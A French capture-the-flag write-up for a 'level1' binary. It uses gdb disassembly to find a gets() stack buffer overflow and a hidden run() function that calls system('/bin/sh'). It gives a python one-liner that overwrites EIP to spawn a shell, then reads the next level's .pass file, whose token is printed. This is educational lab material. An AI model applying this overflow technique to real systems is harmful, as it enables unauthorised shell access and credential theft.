# Level 1

Quand je lance le programme `level1` je peux voir qu'il lit sur l'entrée standard, il doit donc être possible de faire un [*buffer overflow*](https://en.wikipedia.org/wiki/Buffer_overflow).  
Je peux tester si le programme `segfault` en écrivant une longue suite de caractères :
```sh
~ ./level1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

Pour déterminer la longueur du buffer, je lance `gdb`. Le buffer est de `0x50` (soit `80` en décimal) comme on peut le voir à l'instruction `<+6>` du main :
```shell
~ gdb level1
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
```

En exécutant la commande `info function` dans `gdb`, on remarque qu'il y a un appel à [`system`](https://linux.die.net/man/3/system) qui se fait dans une fonction `run` :
```shell
(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
[...]
0x08048444  run
0x08048480  main
[...]
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.
(gdb) x/s 0x8048584
0x8048584:	 "/bin/sh"
```

L'argument que prend `system` est `/bin/sh`. Notre objectif est donc d'appeler `run` à la place d'un `shellcode` en utilisant son adresse `0x08048444`. Il faut d'abord convertir cette adresse en format [*little endian*](https://en.wikipedia.org/wiki/Endianness), soit `\x44\x84\x04\x08`.  
Notre exploit utilisera la technique du [*stack smashing*](https://insecure.org/stf/smashstack.html) (voir aussi [cet article](https://www.exploit-db.com/papers/24085)).
    - Dans une architecture x86 32 bits, le registre `eip` contient l'[*instruction pointer*](https://en.wikipedia.org/wiki/Program_counter), càd l'adresse mémoire de la prochaine commande à exécuter.
    - Concrétement, on va ici écrire au delà de la mémoire tampon pour écraser la valeur du registre `eip` et y placer l'adresse de la fonction `run`
    - Pour cela, nous utiliserons un padding de 76 caractères, puisque les 4 derniers caractères de la chaîne contiendront l'adresse que nous allons écrire dans le registre `eip`.

```shell
~ python -c 'print "A"*76+"\x44\x84\x04\x08"' > /tmp/run
~ cat /tmp/run - | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```